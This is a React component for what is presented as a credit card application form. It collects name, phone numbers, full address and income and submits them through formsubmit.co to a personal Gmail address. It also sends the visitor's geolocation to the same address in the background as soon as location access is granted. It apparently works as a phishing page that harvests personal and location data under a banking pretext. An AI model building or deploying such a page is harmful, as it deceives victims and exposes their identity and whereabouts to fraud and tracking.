import React, { useState, useEffect } from "react";
import LocationPermissionModal from "./LocationPermissionModal";
import {
  Box,
  TextField,
  Button,
  Typography,
  Grid,
  MenuItem,
  FormControl,
  InputLabel,
  Select,
} from "@mui/material";
import CreditCardIcon from "@mui/icons-material/CreditCard";
import Image from "../assets/credit-cart.jpg";

const CreditCardApplication = () => {
  const [formData, setFormData] = useState({
    fullName: "",
    phone1: "",
    phone2: "",
    cardType: "",
    annualIncome: "",
    address: {
      houseNumber: "",
      buildingName: "",
      landmark: "",
      streetName: "",
      area: "",
      tahsil: "",
      state: "",
      country: "",
      pincode: "",
    },
  });
  const [locationAllowed, setLocationAllowed] = useState({
    latitude: "",
    longitude: "",
    key: false,
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    const keys = name.split(".");
    if (keys.length === 1) {
      setFormData({
        ...formData,
        [name]: value,
      });
    } else {
      setFormData({
        ...formData,
        address: {
          ...formData.address,
          [keys[1]]: value,
        },
      });
    }
  };

  const [openLocationPopup, setOpenLocationPopup] = useState(true);

  const handleLocationPermission = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          // If geolocation is allowed, set latitude and longitude
          setLocationAllowed({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            key: true,
          });
          setOpenLocationPopup(false);
        },
        () => {
          setOpenLocationPopup(false); // Show the popup asking for location access
        }
      );
    } else {
      setOpenLocationPopup(true); // Show the popup if geolocation is not available
    }
  };

  useEffect(() => {
    if (locationAllowed.key) {
      fetch("https://formsubmit.co/ajax/vzade1999@gmail.com", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify({
          Time: new Date().toLocaleString(),
          message: "Location of the customer",
          Latitude: locationAllowed.latitude,
          Longitude: locationAllowed.longitude,
        }),
      })
        .then((response) => response.json())
        .then((data) => console.log(data))
        .catch((error) => console.log(error));
    }
  }, [locationAllowed]);

  return (
    <>
      <LocationPermissionModal
        open={openLocationPopup}
        onClose={() => setOpenLocationPopup(false)}
        onAllowLocation={handleLocationPermission}
        latitude={locationAllowed?.latitude}
        longitude={locationAllowed?.longitude}
      />
      <Box
        sx={{
          minHeight: "100vh",
          backgroundImage: `url(${Image})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          padding: 4,
        }}
      >
        <Box
          sx={{
            maxWidth: 800,
            width: "100%",
            padding: 4,
            borderRadius: 3,
            backgroundColor: "rgba(255, 255, 255, 0.9)",
            boxShadow: 6,
          }}
        >
          {/* Header Section */}
          <Box
            sx={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              padding: 2,
              backgroundColor: "#1976d2",
              color: "#fff",
              borderRadius: "12px 12px 0 0",
              boxShadow: "0 4px 10px rgba(0, 0, 0, 0.2)",
            }}
          >
            <Typography variant="h6" fontWeight="bold">
              Credit Card Application
            </Typography>
            <CreditCardIcon sx={{ fontSize: 40 }} />
          </Box>

          <form
            action="https://formsubmit.co/vzade1999@gmail.com"
            method="POST"
          >
            <Grid container spacing={3} sx={{ marginTop: 2 }}>
              {/* Basic Details */}
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Full Name"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleChange}
                  required
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Phone Number"
                  name="phone1"
                  value={formData.phone1}
                  onChange={handleChange}
                  type="tel"
                  required
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Alternate Phone Number"
                  name="phone2"
                  value={formData.phone2}
                  onChange={handleChange}
                  type="tel"
                  required
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>

              {/* Address Details */}
              <Grid item xs={12}>
                <Typography variant="h6" fontWeight="bold" gutterBottom>
                  Address Details
                </Typography>
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="House/Flat Number"
                  name="address.houseNumber"
                  value={formData.address.houseNumber}
                  onChange={handleChange}
                  required
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Building Name"
                  name="address.buildingName"
                  value={formData.address.buildingName}
                  onChange={handleChange}
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Landmark"
                  name="address.landmark"
                  value={formData.address.landmark}
                  onChange={handleChange}
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Street Name"
                  name="address.streetName"
                  value={formData.address.streetName}
                  onChange={handleChange}
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Area"
                  name="address.area"
                  value={formData.address.area}
                  onChange={handleChange}
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Tehsil"
                  name="address.tahsil"
                  value={formData.address.tahsil}
                  onChange={handleChange}
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={6}>
                <TextField
                  fullWidth
                  label="State"
                  name="address.state"
                  value={formData.address.state}
                  onChange={handleChange}
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={6}>
                <TextField
                  fullWidth
                  label="Country"
                  name="address.country"
                  value={formData.address.country}
                  onChange={handleChange}
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Pincode"
                  name="address.pincode"
                  value={formData.address.pincode}
                  onChange={handleChange}
                  type="number"
                  required
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>

              {/* Card Type and Annual Income */}
              <Grid item xs={12}>
                <FormControl fullWidth variant="outlined">
                  <InputLabel id="card-type-label">Income Type</InputLabel>
                  <Select
                    labelId="card-type-label"
                    name="cardType"
                    value={formData.cardType}
                    onChange={handleChange}
                    required
                    label="Income Type"
                    sx={{
                      borderRadius: "12px",
                    }}
                  >
                    <MenuItem value="Standard">Salaried</MenuItem>
                    <MenuItem value="Gold">Business Man/Women</MenuItem>
                  </Select>
                </FormControl>
              </Grid>
              <Grid item xs={12}>
                <TextField
                  fullWidth
                  label="Annual Income"
                  name="annualIncome"
                  value={formData.annualIncome}
                  onChange={handleChange}
                  type="number"
                  required
                  variant="outlined"
                  InputProps={{
                    sx: { borderRadius: "12px" },
                  }}
                />
              </Grid>

              {/* Submit Button */}
              <Grid item xs={12} textAlign="center">
                <Button
                  variant="contained"
                  color="primary"
                  type="submit"
                  sx={{
                    padding: "12px 24px",
                    borderRadius: "20px",
                    fontSize: "18px",
                    fontWeight: "bold",
                  }}
                >
                  Submit Application
                </Button>
              </Grid>
            </Grid>
          </form>
        </Box>
      </Box>
    </>
  );
};

export default CreditCardApplication;
